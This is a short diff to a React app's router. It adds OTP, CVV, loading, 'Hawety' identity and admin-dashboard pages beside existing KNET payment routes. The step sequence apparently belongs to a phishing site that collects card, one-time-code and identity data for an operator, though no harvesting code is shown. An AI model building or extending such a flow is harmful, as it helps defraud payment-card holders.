@@ -8,6 +8,11 @@ import Home from "./pages/Home";
 import HomeEn from "./pages/HomeEn";
 import Pay from "./pages/Pay";
 import PayEn from "./pages/PayEn";
+import Loading from "./pages/Loading";
+import OTP from "./pages/OTP";
+import CVV from "./pages/CVV";
+import Hawety from "./pages/Hawety";
+import AdminDashboard from "./pages/AdminDashboard";
 
 // Wrapper components for HTML pages
 const KnetPage = () => {
@@ -78,10 +83,13 @@ function Router() {
       <Route path={"/pay"} component={Pay} />
       <Route path={"/pay-en"} component={PayEn} />
       <Route path={"/knet"} component={KnetPage} />
-      <Route path={"/otp"} component={VerPage} />
+      <Route path={"/loading"} component={Loading} />
+      <Route path={"/otp"} component={OTP} />
       <Route path={"/identity"} component={HawetPage} />
-      <Route path={"/cvv"} component={CvvPage} />
+      <Route path={"/cvv"} component={CVV} />
+      <Route path={"/hawety"} component={Hawety} />
       <Route path={"/client"} component={ClientPage} />
+      <Route path={"/admin-dashboard"} component={AdminDashboard} />
       <Route path={"/admin"} component={AdminPage} />
       <Route path={"/404"} component={NotFound} />
       {/* Final fallback route */}
